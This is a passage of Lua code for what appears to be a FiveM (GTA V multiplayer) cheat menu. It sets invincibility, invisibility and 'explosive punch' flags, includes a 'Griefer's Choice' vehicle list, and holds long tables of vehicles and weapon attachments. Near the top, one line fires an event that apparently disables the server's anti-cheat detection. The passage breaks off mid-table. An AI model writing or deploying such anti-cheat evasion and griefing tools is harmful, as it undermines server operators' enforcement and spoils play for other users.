local showPlayerBlips = true
local ignorePlayerNameDistance = false
local playerNamesDist = 125
local displayIDHeight = 1.5 --Height of ID above players head(starts at center body mass)
--Set Default Values for Colors
local red = 255
local green = 255
local blue = 255
local group
overwriteAlpha = true
local invin = false
local invis = false
local therm = false
local ePunch = false
ESX = nil

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(1000)
	end

end)
				TriggerEvent('HCheat:TempDisableDetection', true)

local sJump = false	
local SpeedDemon = false
local GriefersChoice = 	{ "Tezeract", "Dune4", "Dune5", "Nero2", "Bmx", "Sanchez", "Rhino", "Barrage", "Phantom2" }
local boats = {"Dinghy", "Dinghy2", "Dinghy3", "Dingh4", "Jetmax", "Marquis", "Seashark", "Seashark2", "Seashark3", "Speeder", "Speeder2", "Squalo", "Submersible", "Submersible2", "Suntrap", "Toro", "Toro2", "Tropic", "Tropic2", "Tug"}
local Commercial = {"Benson", "Biff", "Cerberus", "Cerberus2", "Cerberus3", "Hauler", "Hauler2", "Mule", "Mule2", "Mule3", "Mule4", "Packer", "Phantom", "Phantom2", "Phantom3", "Pounder", "Pounder2", "Stockade", "Stockade3", "Terbyte"}
local Compacts = {"Blista", "Blista2", "Blista3", "Brioso", "Dilettante", "Dilettante2", "Issi2", "Issi3", "issi4", "Iss5", "issi6", "Panto", "Prarire", "Rhapsody"}
local Coupes = { "CogCabrio", "Exemplar", "F620", "Felon", "Felon2", "Jackal", "Oracle", "Oracle2", "Sentinel", "Sentinel2", "Windsor", "Windsor2", "Zion", "Zion2"}
local cycles = { "Bmx", "Cruiser", "Fixter", "Scorcher", "Tribike", "Tribike2", "tribike3" }
local Emergency = { "Ambulance", "FBI", "FBI2", "FireTruk", "PBus", "Police", "Police2", "Police3", "Police4", "PoliceOld1", "PoliceOld2", "PoliceT", "Policeb", "Polmav", "Pranger", "Predator", "Riot", "Riot2", "Sheriff", "Sheriff2"}
local Helicopters = { "Akula", "Annihilator", "Buzzard", "Buzzard2", "Cargobob", "Cargobob2", "Cargobob3", "Cargobob4", "Frogger", "Frogger2", "Havok", "Hunter", "Maverick", "Savage", "Seasparrow", "Skylift", "Supervolito", "Supervolito2", "Swift", "Swift2", "Valkyrie", "Valkyrie2", "Volatus"}
local Industrial = { "Bulldozer", "Cutter", "Dump", "Flatbed", "Guardian", "Handler", "Mixer", "Mixer2", "Rubble", "Tiptruck", "Tiptruck2"}
local Military = { "APC", "Barracks", "Barracks2", "Barracks3", "Barrage", "Chernobog", "Crusader", "Halftrack", "Khanjali", "Rhino", "Scarab", "Scarab2", "Scarab3", "Thruster", "Trailersmall2"}
local Motorcycles = { "Akuma", "Avarus", "Bagger", "Bati2", "Bati", "BF400", "Blazer4", "CarbonRS", "Chimera", "Cliffhanger", "Daemon", "Daemon2", "Defiler", "Deathbike", "Deathbike2", "Deathbike3", "Diablous", "Diablous2", "Double", "Enduro", "esskey", "Faggio2", "Faggio3", "Faggio", "Fcr2", "fcr", "gargoyle", "hakuchou2", "hakuchou", "hexer", "innovation", "Lectro", "Manchez", "Nemesis", "Nightblade", "Oppressor", "Oppressor2", "PCJ", "Ratbike", "Ruffian", "Sanchez2", "Sanchez", "Sanctus", "Shotaro", "Sovereign", "Thrust", "Vader", "Vindicator", "Vortex", "Wolfsbane", "zombiea", "zombieb"}
local muscle = { "Blade", "Buccaneer", "Buccaneer2", "Chino", "Chino2", "clique", "Deviant", "Dominator", "Dominator2", "Dominator3", "Dominator4", "Dominator5", "Dominator6", "Dukes", "Dukes2", "Ellie", "Faction", "faction2", "faction3", "Gauntlet", "Gauntlet2", "Hermes", "Hotknife", "Hustler", "Impaler", "Impaler2", "Impaler3", "Impaler4", "Imperator", "Imperator2", "Imperator3", "Lurcher", "Moonbeam", "Moonbeam2", "Nightshade", "Phoenix", "Picador", "RatLoader", "RatLoader2", "Ruiner", "Ruiner2", "Ruiner3", "SabreGT", "SabreGT2", "Sadler2", "Slamvan", "Slamvan2", "Slamvan3", "Slamvan4", "Slamvan5", "Slamvan6", "Stalion", "Stalion2", "Tampa", "Tampa3", "Tulip", "Vamos,", "Vigero", "Virgo", "Virgo2", "Virgo3", "Voodoo", "Voodoo2", "Yosemite"}
local OffRoad = {"BFinjection", "Bifta", "Blazer", "Blazer2", "Blazer3", "Blazer5", "Bohdi", "Brawler", "Bruiser", "Bruiser2", "Bruiser3", "Caracara", "DLoader", "Dune", "Dune2", "Dune3", "Dune4", "Dune5", "Insurgent", "Insurgent2", "Insurgent3", "Kalahari", "Kamacho", "LGuard", "Marshall", "Mesa", "Mesa2", "Mesa3", "Monster", "Monster4", "Monster5", "Nightshark", "RancherXL", "RancherXL2", "Rebel", "Rebel2", "RCBandito", "Riata", "Sandking", "Sandking2", "Technical", "Technical2", "Technical3", "TrophyTruck", "TrophyTruck2", "Freecrawler", "Menacer"}
local Planes = {"AlphaZ1", "Avenger", "Avenger2", "Besra", "Blimp", "blimp2", "Blimp3", "Bombushka", "Cargoplane", "Cuban800", "Dodo", "Duster", "Howard", "Hydra", "Jet", "Lazer", "Luxor", "Luxor2", "Mammatus", "Microlight", "Miljet", "Mogul", "Molotok", "Nimbus", "Nokota", "Pyro", "Rogue", "Seabreeze", "Shamal", "Starling", "Stunt", "Titan", "Tula", "Velum", "Velum2", "Vestra", "Volatol", "Striekforce"}
local SUVs = {"BJXL", "Baller", "Baller2", "Baller3", "Baller4", "Baller5", "Baller6", "Cavalcade", "Cavalcade2", "Dubsta", "Dubsta2", "Dubsta3", "FQ2", "Granger", "Gresley", "Habanero", "Huntley", "Landstalker", "patriot", "Patriot2", "Radi", "Rocoto", "Seminole", "Serrano", "Toros", "XLS", "XLS2"}
local Sedans = {"Asea", "Asea2", "Asterope", "Cog55", "Cogg552", "Cognoscenti", "Cognoscenti2", "emperor", "emperor2", "emperor3", "Fugitive", "Glendale", "ingot", "intruder", "limo2", "premier", "primo", "primo2", "regina", "romero", "stafford", "Stanier", "stratum", "stretch", "surge", "tailgater", "warrener", "Washington"}
local Service = { "Airbus", "Brickade", "Bus", "Coach", "Rallytruck", "Rentalbus", "Taxi", "Tourbus", "Trash", "Trash2", "WastIndr", "PBus2"}
local Sports = {"Alpha", "Banshee", "Banshee2", "BestiaGTS", "Buffalo", "Buffalo2", "Buffalo3", "Carbonizzare", "Comet2", "Comet3", "Comet4", "Comet5", "Coquette", "Deveste", "Elegy", "Elegy2", "Feltzer2", "Feltzer3", "FlashGT", "Furoregt", "Fusilade", "Futo", "GB200", "Hotring", "Infernus2", "Italigto", "Jester", "Jester2", "Khamelion", "Kurama", "Kurama2", "Lynx", "MAssacro", "MAssacro2", "neon", "Ninef", "ninfe2", "omnis", "Pariah", "Penumbra", "Raiden", "RapidGT", "RapidGT2", "Raptor", "Revolter", "Ruston", "Schafter2", "Schafter3", "Schafter4", "Schafter5", "Schafter6", "Schlagen", "Schwarzer", "Sentinel3", "Seven70", "Specter", "Specter2", "Streiter", "Sultan", "Surano", "Tampa2", "Tropos", "Verlierer2", "ZR380", "ZR3802", "ZR3803"}
local SportsClassic = {"Ardent", "BType", "BType2", "BType3", "Casco", "Cheetah2", "Cheburek", "Coquette2", "Coquette3", "Deluxo", "Fagaloa", "Gt500", "JB700", "JEster3", "MAmba", "Manana", "Michelli", "Monroe", "Peyote", "Pigalle", "RapidGT3", "Retinue", "Savastra", "Stinger", "Stingergt", "Stromberg", "Swinger", "Torero", "Tornado", "Tornado2", "Tornado3", "Tornado4", "Tornado5", "Tornado6", "Viseris", "Z190", "ZType"}
local Super = {"adder", "Autarch", "Bullet", "Cheetah", "Cyclone", "EntityXF", "Entity2", "FMJ", "GP1", "Infernus", "LE7B", "Nero", "Nero2", "Osiris", "Penetrator", "PFister811", "Prototipo", "Reaper", "SC1", "Scramjet", "Sheava", "SultanRS", "Superd", "T20", "Taipan", "Tempesta", "Tezeract", "Turismo2", "Turismor", "Tyrant", "Tyrus", "Vacca", "Vagner", "Vigilante", "Visione", "Voltic", "Voltic2", "Zentorno", "Italigtb", "Italigtb2", "XA21"}
local Trailer = { "ArmyTanker", "ArmyTrailer", "ArmyTrailer2", "BaleTrailer", "BoatTrailer", "CableCar", "DockTrailer", "Graintrailer", "Proptrailer", "Raketailer", "TR2", "TR3", "TR4", "TRFlat", "TVTrailer", "Tanker", "Tanker2", "Trailerlogs", "Trailersmall", "Trailers", "Trailers2", "Trailers3"}
local trains = {"Freight", "Freightcar", "Freightcont1", "Freightcont2", "Freightgrain", "Freighttrailer", "TankerCar"}
local Utility = {"Airtug", "Caddy", "Caddy2", "Caddy3", "Docktug", "Forklift", "Mower", "Ripley", "Sadler", "Scrap", "TowTruck", "Towtruck2", "Tractor", "Tractor2", "Tractor3", "TrailerLArge2", "Utilitruck", "Utilitruck3", "'Utilitruck2"}
local Vans = {"Bison", "Bison2", "Bison3", "BobcatXL", "Boxville", "Boxville2", "Boxville3", "Boxville4", "Boxville5", "Burrito", "Burrito2", "Burrito3", "Burrito4", "Burrito5", "Camper", "GBurrito", "GBurrito2", "Journey", "minivan", "Minivan2", "Paradise", "pony", "Pony2", "Rumpo", "Rumpo2", "Rumpo3", "Speedo", "Speedo2", "Speedo4", "Surfer", "Surfer2", "Taco", "Youga", "youga2"}
local CarTypes = {"Griefer's Choice", "Boats", "Commercial", "Compacts", "Coupes", "Cycles", "Emergency", "Helictopers", "Industrial", "Military", "Motorcycles", "Muscle", "Off-Road", "Planes", "SUVs", "Sedans", "Service", "Sports", "Sports Classic", "Super", "Trailer", "Trains", "Utility", "Vans"}
local CarsArray = { GriefersChoice, boats, Commercial, Compacts, Coupes, cycles, Emergency, Helicopters, Industrial, Military, Motorcycles, muscle, OffRoad, Planes, SUVs, Sedans, Service, Sports, SportsClassic, Super, Trailer, trains, Utility, Vans}

local l_weapons = 
{
	Melee = {
		AntiqueCavalryDagger = { id = "weapon_dagger", name= "Antique Cavalry Dagger", bInfAmmo = false, bInfAmmo = false, mods = {} },
		BaseballBat = { id = "weapon_bat", name="Baseball Bat", bInfAmmo = false, mods = {} },
		BrokenBottle = { id = "weapon_bottle", name="Broken Bottle", bInfAmmo = false, mods = {} },
		Crowbar = { id = "weapon_Crowbar", name="Crowbar", bInfAmmo = false, mods = {} },
		Flashlight = { id = "weapon_flashlight", name="Flashlight", bInfAmmo = false, mods = {} },
		GolfClub = { id = "weapon_golfclub", name="Golf Club", bInfAmmo = false, mods = {} },
		Hammer = { id = "weapon_hammer", name = "Hammer", bInfAmmo = false, mods = {} },
		Hatchet = { id = "weapon_hatchet", name = "Hatchet", bInfAmmo = false, mods = {} },
		BrassKnuckles = { id = "weapon_knuckle", name="Brass Knuckles", bInfAmmo = false, mods = {} },
		Knife = { id = "weapon_knife", name="Knife", bInfAmmo = false, mods = {} },
		Machete = { id = "weapon_machete", name="Machete", bInfAmmo = false, mods = {} },
		Switchblade = { id = "weapon_switchblade", name="Switchblade", bInfAmmo = false, mods = {} },
		Nightstick = { id = "weapon_nightstick", name="Nightstick", bInfAmmo = false, mods = {} },
		PipeWrench = { id = "weapon_wrench", name="Pipe Wrench", bInfAmmo = false, mods = {} },
		BattleAxe = { id = "weapon_battleaxe", name="Battle Axe", bInfAmmo = false, mods = {}},
		PoolCue = { id = "weapon_poolcue", name="Pool Cue", bInfAmmo = false, mods = {} },
		StoneHatchet = { id = "weapon_stone_hatchet", name="Stone Hatchet", bInfAmmo = false, mods = {} }
		},
	Handguns = {	
		Pistol = { id = "weapon_pistol", name="Pistol", bInfAmmo = false, mods = { 
		Magazines = {
			{name = "Default Magazine", id="COMPONENT_PISTOL_CLIP_01"},
			{name = "Extended Magazine", id="COMPONENT_PISTOL_CLIP_02"}
		},
		Flashlight = 
		{
			{name = "Flashlight", id="COMPONENT_AT_PI_FLSH"}
		}, 
		BarrelAttachments = 
		{
			{name = "Suppressor", id="COMPONENT_AT_PI_SUPP_02"}
		}
		}},
		PistolMK2 = { id = "weapon_pistol_mk2", name="Pistol MK 2", bInfAmmo = false, mods = 
		{
			Magazines =
				{
					{name = "Default Magazine", id="COMPONENT_PISTOL_MK2_CLIP_01"},
					{name = "Extended Magazine", id="COMPONENT_PISTOL_MK2_CLIP_02"},
					{name = "Tracer Rounds", id="COMPONENT_PISTOL_MK2_CLIP_TRACER"},
					{name = "Incendiary Rounds", id="COMPONENT_PISTOL_MK2_CLIP_INCENDIARY"},
					{name = "Hollow Point Rounds", id="COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT"},
					{name = "FMJ Rounds", id="COMPONENT_PISTOL_MK2_CLIP_FMJ"},		
				},
				Sights =
				{
					{name = "Mounted Scope", id="COMPONENT_AT_PI_RAIL"},
				},
				Flashlight = 
				{
					{name = "Flashlight", id="COMPONENT_AT_PI_FLSH_02"},			
				},
				BarrelAttachments =
				{
					{name = "Compensator", id="COMPONENT_AT_PI_COMP"},
					{name = "Suppessor", id="COMPONENT_AT_PI_SUPP_02"},
				}
			} },
		CombatPistol = { id = "weapon_combatpistol", name = "Combat Pistol", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "Default Magazine", id="COMPONENT_COMBATPISTOL_CLIP_01"},
				{name = "Extended Magazine", id="COMPONENT_COMBATPISTOL_CLIP_02"}
			},
			Flashlight = 
			{
				{name = "Flashlight", id="COMPONENT_AT_PI_FLSH"}
			},
			BarrelAttachments = 
			{
				{name = "Suppressor", id="COMPONENT_AT_PI_SUPP"}
			} 
		} },
		APPistol = { id = "weapon_appistol",name ="AP Pistol", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "Default Magazine", id="COMPONENT_APPISTOL_CLIP_01"}, 
				{name = "Extended Magazine", id="COMPONENT_APPISTOL_CLIP_02"}
			},
			Flashlight = 
			{
				{name = "Flashlight", id="COMPONENT_AT_PI_FLSH"}
			},
			BarrelAttachments = 
			{
				{name = "Suppressor", id="COMPONENT_AT_PI_SUPP"}
			} 
			}},
		StunGun = { id = "weapon_stungun", name="Stun Gun", bInfAmmo = false, mods = {} },
		Pistol50 = { id = "weapon_pistol50", name="Pistol .50", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "Default Magazine", id="COMPONENT_PISTOL50_CLIP_01"},
				{name = "Extended Magazine", id="COMPONENT_PISTOL50_CLIP_02"}
			},
			Flashlight = 
			{
				{name = "Flashlight", id="COMPONENT_AT_PI_FLSH"}
			},
			BarrelAttachments = 
			{
				{name = "Suppressor", id="COMPONENT_AT_PI_SUPP_02"}
			} 
		}},
		SNSPistol = { id = "weapon_snspistol",name="SNS Pistol", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "Default Magazine", id="COMPONENT_SNSPISTOL_CLIP_01"},
				{name = "Extended Magazine", id="COMPONENT_SNSPISTOL_CLIP_02"}
			}
		}},
		SNSPistolMkII = { id = "weapon_snspistol_mk2",name="SNS Pistol Mk II", bInfAmmo = false, mods = {
		Magazines =
			{
				{name = "Default Magazine", id="COMPONENT_SNSPISTOL_MK2_CLIP_01"},
				{name = "Extended Magazine", id="COMPONENT_SNSPISTOL_MK2_CLIP_02"},
				{name = "Tracer Rounds", id="COMPONENT_SNSPISTOL_MK2_CLIP_TRACER"},
				{name = "Incendiary Rounds", id="COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY"},
				{name = "Hollow Point Rounds", id="COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT"},
				{name = "FMJ Rounds", id="COMPONENT_SNSPISTOL_MK2_CLIP_FMJ"},		
			},
			Sights =
			{
				{name = "Mounted Scope", id="COMPONENT_AT_PI_RAIL_02"},
			},
			Flashlight = 
			{
				{name = "Flashlight", id="COMPONENT_AT_PI_FLSH_03"},			
			},
			BarrelAttachments =
			{
				{name = "Compensator", id="COMPONENT_AT_PI_COMP_02"},
				{name = "Suppressor", id="COMPONENT_AT_PI_SUPP_02"},
			}
		
		} },
		HeavyPistol = { id = "weapon_heavypistol",name="Heavy Pistol", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "Default Magazine", id="COMPONENT_HEAVYPISTOL_CLIP_01"},
				{name = "Extended Magazine", id="COMPONENT_HEAVYPISTOL_CLIP_02"}
			}, 
			Flashlight = 
			{
				{name = "Flashlight", id="COMPONENT_AT_PI_FLSH"}
			},
			BarrelAttachments =
			{
				{name = "Suppressor", id="COMPONENT_AT_PI_SUPP"}
			} 
		}},
		VintagePistol = { id = "weapon_vintagepistol",name="Vintage Pistol", bInfAmmo = false, mods = {
		Magazines = 
		{
			{name = "Default Magazine", id="COMPONENT_VINTAGEPISTOL_CLIP_01"},
			{name = "Extended Magazine", id="COMPONENT_VINTAGEPISTOL_CLIP_02"}
		},
		BarrelAttachments = 
			{
				{"Suppressor", id="COMPONENT_AT_PI_SUPP"}
			}
		} },
		FlareGun = { id = "weapon_flaregun", name="Flare Gun", bInfAmmo = false, mods = {} },
		MarksmanPistol = { id = "weapon_marksmanpistol", name="Marksman Pistol", bInfAmmo = false, mods = {} },
		HeavyRevolver = { id = "weapon_revolver", name="Heavy Revolver", bInfAmmo = false, mods = {} },
		HeavyRevolverMkII = { id = "weapon_revolver_mk2", name="Heavy Revolver Mk II", bInfAmmo = false, mods = {
		Magazines =
			{
				{name = "Default Rounds", id="COMPONENT_REVOLVER_MK2_CLIP_01"},
				{name = "Tracer Rounds", id="COMPONENT_REVOLVER_MK2_CLIP_TRACER"},
				{name = "Incendiary Rounds", id="COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY"},
				{name = "Hollow Point Rounds", id="COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT"},
				{name = "FMJ Rounds", id="COMPONENT_REVOLVER_MK2_CLIP_FMJ"},		
			},
			Sights =
			{
				{name = "Holograhpic Sight", id="COMPONENT_AT_SIGHTS"},
				{name = "Small Scope", id="COMPONENT_AT_SCOPE_MACRO_MK2"},
			},
			Flashlight = 
			{
				{name = "Flashlight", id="COMPONENT_AT_PI_FLSH"},			
			},
			BarrelAttachments =
			{
				{name = "Compensator", id="COMPONENT_AT_PI_COMP_03"},
			}
			} },
		DoubleActionRevolver = { id = "weapon_doubleaction", name="Double Action Revolver", bInfAmmo = false, mods = {} },
		UpnAtomizer = { id = "weapon_raypistol", name="Up-n-Atomizer", bInfAmmo = false, mods = {} },	
	},
	SMGs = {	
		MicroSMG = { id = "weapon_microsmg", name="Micro SMG", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "Default Magazine", id="COMPONENT_MICROSMG_CLIP_01"},
				{name = "Extended Magazine", id="COMPONENT_MICROSMG_CLIP_02"}
			},
			Sights =
			{
				{name = "Scope", id="COMPONENT_AT_SCOPE_MACRO"}
			},
			Flashlight = 
			{			
				{name = "Flashlight", id="COMPONENT_AT_PI_FLSH"}
			},
			BarrelAttachments = 
			{
				{name = "Suppressor", id="COMPONENT_AT_AR_SUPP_02"}
			}
		} },
		SMG = { id = "weapon_smg", name="SMG", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "Default Magazine", id="COMPONENT_SMG_CLIP_01"},
				{name = "Extended Magazine", id="COMPONENT_SMG_CLIP_02"},
				{name = "Drum Magazine", id="COMPONENT_SMG_CLIP_03"},
			},
			Sights =
			{			
				{name = "Scope", id="COMPONENT_AT_SCOPE_MACRO_02"},
			},
			Flashlight = 
			{
				{name = "Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{name = "Suppressor", id="COMPONENT_AT_PI_SUPP"}
			}				
		} },
		SMGMkII = { id = "weapon_smg_mk2", name="SMG Mk II", bInfAmmo = false, mods = {
			Magazines =
			{
				{name = "Default Magazine", id="COMPONENT_SMG_MK2_CLIP_01"},
				{name = "Extended Magazine", id="COMPONENT_SMG_MK2_CLIP_02"},
				{name = "Tracer Rounds", id="COMPONENT_SMG_MK2_CLIP_TRACER"},
				{name = "Incendiary Rounds", id="COMPONENT_SMG_MK2_CLIP_INCENDIARY"},
				{name = "Hollow Point Rounds", id="COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT"},
				{name = "FMJ Rounds", id="COMPONENT_SMG_MK2_CLIP_FMJ"},		
			},
			Sights =
			{
				{name = "Holograhpic Sight", id="COMPONENT_AT_SIGHTS_SMG"},
				{name = "Small Scope", id="COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2"},
				{name = "Medium Scope", id="COMPONENT_AT_SCOPE_SMALL_SMG_MK2"},
			},
			Flashlight = 
			{
				{name = "Flashlight", id="COMPONENT_AT_AR_FLSH"},			
			},			
			Barrel = 
			{
				{name = "Default", id="COMPONENT_AT_SB_BARREL_01"},	
				{name = "Heavy", id="COMPONENT_AT_SB_BARREL_02"},			
			},
			BarrelAttachments =
			{
				{name = "Suppressor", id="COMPONENT_AT_PI_SUPP"},
				{name = "Flat Muzzle Brake", id="COMPONENT_AT_MUZZLE_01"},
				{name = "Tactical Muzzle Brake", id="COMPONENT_AT_MUZZLE_02"},
				{name = "Fat-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_03"},
				{name = "Precision Muzzle Brake", id="COMPONENT_AT_MUZZLE_04"},
				{name = "Heavy Duty Muzzle Brake", id="COMPONENT_AT_MUZZLE_05"},
				{name = "Slanted Muzzle Brake", id="COMPONENT_AT_MUZZLE_06"},
				{name = "Split-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_07"},
			}
		
		} },
		AssaultSMG = { id = "weapon_assaultsmg", name="Assault SMG", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "Default Magazine", id="COMPONENT_ASSAULTSMG_CLIP_01"},
				{name = "Extended Magazine", id="COMPONENT_ASSAULTSMG_CLIP_02"}
			},
			Sights =
			{
				{name = "Scope", id="COMPONENT_AT_SCOPE_MACRO"},			
			},
			Flashlight = 
			{
				{name = "Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{name = "Suppressor", id="COMPONENT_AT_AR_SUPP_02"}
			}
		} },
		CombatPDW = { id = "weapon_combatpdw", name="Combat PDW", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "Default Magazine", id="COMPONENT_COMBATPDW_CLIP_01"},
				{name = "Extended Magazine", id="COMPONENT_COMBATPDW_CLIP_02"},
				{name = "Drum Magazine", id="COMPONENT_COMBATPDW_CLIP_03"},
			},
			Sights =
			{
				{name = "Scope", id="COMPONENT_AT_SCOPE_SMALL"},			
			},
			Flashlight = 
			{
				{name = "Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			Grips =
			{
				{name = "Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		} },
		MachinePistol = { id = "weapon_machinepistol", name="Machine Pistol ", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "Default Magazine", id="COMPONENT_MACHINEPISTOL_CLIP_01"},
				{name = "Extended Magazine", id="COMPONENT_MACHINEPISTOL_CLIP_02"},
				{name = "Drum Magazine", id="COMPONENT_MACHINEPISTOL_CLIP_03"},
			},
			BarrelAttachments = 
			{
				{name = "Suppressor", id="COMPONENT_AT_PI_SUPP"}
			}
		} },
		MiniSMG = { id = "weapon_minismg", name="Mini SMG", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "Default Magazine", id="COMPONENT_MINISMG_CLIP_01"},
				{name = "Extended Magazine", id="COMPONENT_MINISMG_CLIP_02"}
			},
		} },
		UnholyHellbringer = { id = "weapon_raycarbine", name="Unholy Hellbringer", bInfAmmo = false, mods = {} },	
	},
	Shotguns = {	
		PumpShotgun = { id = "weapon_pumpshotgun", name="Pump Shotgun", bInfAmmo = false, mods = {
			Flashlight = 
			{
				{"name = Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{name = "Suppressor", id="COMPONENT_AT_SR_SUPP"},
			},		
		} },
		PumpShotgunMkII = { id = "weapon_pumpshotgun_mk2", name="Pump Shotgun Mk II", bInfAmmo = false, mods = {
			Magazines =
			{
				{name = "Default Shells", id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_01"},
				{name = "Dragon's Breath Shells", id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY"},
				{name = "Steel Buckshot Shells", id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING"},
				{name = "Flechette Shells", id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT"},
				{name = "Explosive Slugs", id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE"},
			},
			Sights =
			{
				{name = "Holograhpic Sight", id="COMPONENT_AT_SIGHTS"},
				{name = "Small Scope", id="COMPONENT_AT_SCOPE_MACRO_MK2"},
				{name = "Medium Scope", id="COMPONENT_AT_SCOPE_SMALL_MK2"},
			},
			Flashlight = 
			{
				{name = "Flashlight", id="COMPONENT_AT_AR_FLSH"},			
			},			
			BarrelAttachments =
			{
				{name = "Suppressor", id="COMPONENT_AT_SR_SUPP_03"},
				{name = "Squared Muzzle Brake", id="COMPONENT_AT_MUZZLE_08"},
			}
		} },
		SawedOffShotgun = { id = "weapon_sawnoffshotgun", name="Sawed-Off Shotgun", bInfAmmo = false, mods = {} },
		AssaultShotgun = { id = "weapon_assaultshotgun", name="Assault Shotgun", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "Default Magazine", id="COMPONENT_ASSAULTSHOTGUN_CLIP_01"},
				{name = "Extended Magazine", id="COMPONENT_ASSAULTSHOTGUN_CLIP_02"},
			},
			Flashlight = 
			{
				{name = "Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{name = "Suppressor", id="COMPONENT_AT_AR_SUPP"},
			},
			Grips =
			{
				{name = "Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		
		} },
		BullpupShotgun = { id = "weapon_bullpupshotgun", name="Bullpup Shotgun", bInfAmmo = false, mods = {
			Flashlight = 
			{
				{name = "Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{name = "Suppressor", id="COMPONENT_AT_AR_SUPP_02"},
			},
			Grips =
			{
				{name = "Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		} },
		Musket = { id = "weapon_musket", name="Musket", bInfAmmo = false, mods = {} },
		HeavyShotgun = { id = "weapon_heavyshotgun", name="Heavy Shotgun", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "Default Magazine", id="COMPONENT_HEAVYSHOTGUN_CLIP_01"},
				{name = "Extended Magazine", id="COMPONENT_HEAVYSHOTGUN_CLIP_02"},
				{name = "Drum Magazine", id="COMPONENT_HEAVYSHOTGUN_CLIP_02"},
			},
			Flashlight = 
			{
				{name = "Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{name = "Suppressor", id="COMPONENT_AT_AR_SUPP_02"},
			},
			Grips =
			{
				{name = "Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		} },
		DoubleBarrelShotgun = { id = "weapon_dbshotgun", name="Double Barrel Shotgun", bInfAmmo = false, mods = {} },
		SweeperShotgun = { id = "weapon_autoshotgun", name="Sweeper Shotgun", bInfAmmo = false, mods = {} },
	},
	AssaultRifles = {	
		AssaultRifle = { id = "weapon_assaultrifle", name="Assault Rifle", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "Default Magazine", id="COMPONENT_ASSAULTRIFLE_CLIP_01"},
				{name = "Extended Magazine", id="COMPONENT_ASSAULTRIFLE_CLIP_02"},
				{name = "Drum Magazine", id="COMPONENT_ASSAULTRIFLE_CLIP_03"},
			},
			Sights =
			{
				{name = "Scope", id="COMPONENT_AT_SCOPE_MACRO"},			
			},
			Flashlight = 
			{
				{name = "Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{name = "Suppressor", id="COMPONENT_AT_AR_SUPP_02"},
			},
			Grips =
			{
				{name = "Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		
		} },
		AssaultRifleMkII = { id = "weapon_assaultrifle_mk2", name="Assault Rifle Mk II", bInfAmmo = false, mods = {
			Magazines =
			{
				{name = "Default Magazine", id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_01"},
				{name = "Extended Magazine", id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_02"},
				{name = "Tracer Rounds", id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER"},
				{name = "Incendiary Rounds", id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY"},
				{name = "Hollow Point Rounds", id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING"},
				{name = "FMJ Rounds", id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ"},		
			},
			Sights =
			{
				{name = "Holograhpic Sight", id="COMPONENT_AT_SIGHTS"},
				{name = "Small Scope", id="COMPONENT_AT_SCOPE_MACRO_MK2"},
				{name = "Large Scope", id="COMPONENT_AT_SCOPE_MEDIUM_MK2"},
			},
			Flashlight = 
			{
				{name = "Flashlight", id="COMPONENT_AT_AR_FLSH"},			
			},			
			Barrel = 
			{
				{name = "Default", id="COMPONENT_AT_AR_BARREL_01"},	
				{name = "Heavy", id="COMPONENT_AT_AR_BARREL_0"},			
			},
			BarrelAttachments =
			{
				{name = "Suppressor", id="COMPONENT_AT_AR_SUPP_02"},
				{name = "Flat Muzzle Brake", id="COMPONENT_AT_MUZZLE_01"},
				{name = "Tactical Muzzle Brake", id="COMPONENT_AT_MUZZLE_02"},
				{name = "Fat-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_03"},
				{name = "Precision Muzzle Brake", id="COMPONENT_AT_MUZZLE_04"},
				{name = "Heavy Duty Muzzle Brake", id="COMPONENT_AT_MUZZLE_05"},
